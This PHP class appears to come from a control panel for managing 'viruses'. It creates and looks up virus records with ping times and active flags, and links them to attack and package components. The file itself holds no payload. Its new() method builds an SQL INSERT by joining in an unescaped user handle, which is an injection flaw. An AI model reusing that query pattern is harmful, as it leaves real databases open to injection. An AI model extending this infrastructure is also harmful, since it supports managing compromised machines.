<?php

namespace Kelvinho\Virus\Virus;

use Kelvinho\Virus\Attack\AttackFactory;
use Kelvinho\Virus\Attack\PackageRegistrar;
use Kelvinho\Virus\Id\IdGenerator;
use Kelvinho\Virus\Session\Session;
use mysqli;

/**
 * Class VirusFactoryImp
 *
 * @package Kelvinho\Virus\Virus
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class VirusFactoryImp implements VirusFactory {
    private Session $session;
    private AttackFactory $attackFactory;
    private IdGenerator $idGenerator;
    private mysqli $mysqli;
    private PackageRegistrar $packageRegistrar;

    public function __construct(Session $session, AttackFactory $attackFactory, IdGenerator $idGenerator, mysqli $mysqli, PackageRegistrar $packageRegistrar) {
        $this->session = $session;
        $this->attackFactory = $attackFactory;
        $this->idGenerator = $idGenerator;
        $this->mysqli = $mysqli;
        $this->packageRegistrar = $packageRegistrar;
    }

    public function new(string $user_handle = null, bool $standalone = true): Virus {
        $virus_id = $this->idGenerator->newVirusId();
        if ($user_handle == null) {
            $user_handle = $this->session->get("user_handle");
        }
        $this->mysqli->query("insert into viruses (virus_id, user_handle, last_ping, name, active, type) values (\"$virus_id\", \"" . $user_handle . "\", 0, \"(not set)\", b'0', b'" . ($standalone ? "0" : "1") . "')");
        mkdir(DATA_FILE . "/viruses/$virus_id");
        touch(DATA_FILE . "/viruses/$virus_id/profile.txt");

        return $this->get($virus_id);
    }

    public function get($virus_id): Virus {
        if (!$this->exists($virus_id)) throw new VirusNotFound();
        return new Virus($virus_id, $this->attackFactory, $this->mysqli, $this->packageRegistrar);
    }

    public function exists(string $virus_id): bool {
        $answer = $this->mysqli->query("select virus_id from viruses where virus_id = \"" . $this->mysqli->escape_string($virus_id) . "\"");
        if ($answer) {
            $row = $answer->fetch_assoc();
            if ($row) {
                return true;
            }
        }
        return false;
    }
}